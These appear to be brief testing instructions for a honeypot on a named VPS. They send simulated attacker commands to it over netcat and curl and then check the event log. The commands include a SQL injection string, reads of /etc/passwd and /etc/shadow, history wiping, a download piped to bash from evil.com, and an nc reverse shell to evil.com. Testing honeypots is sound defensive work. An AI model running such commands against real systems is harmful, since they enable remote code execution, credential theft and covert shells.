To test it (43.205.138.66) --this is real public IP of our vps where backend is running:
2222--ports
2121--ports
2525--ports 

--------------------------------------------------------------------------------------------xxxxxxxxxxxxx-----------------------------------------------------------------
IN A TERMINAL : 
# Test SSH honeypot
nc 43.205.138.66 2222


# Test FTP honeypot
nc 43.205.138.66 2121

# Test HTTP honeypot
curl http://localhost:8080/admin
curl "http://localhost:8080/login?id=1' OR 1=1--"\

# Test SSH honeypot
echo "cat /etc/passwd" | nc -w 2 43.205.138.66 2222
echo "cat /etc/shadow" | nc -w 2 43.205.138.66 2222
echo "sudo su -" | nc -w 2 43.205.138.66 2222
echo "wget http://evil.com/malware.sh | bash" | nc -w 2 43.205.138.66 2222
echo "find / -perm -4000 -type f" | nc -w 2 43.205.138.66 2222
echo "history -c && unset HISTFILE" | nc -w 2 43.205.138.66 2222
echo "nc -e /bin/bash evil.com 4444" | nc -w 2 43.205.138.66 2222

after this check the event log it displays your IP, payload everything
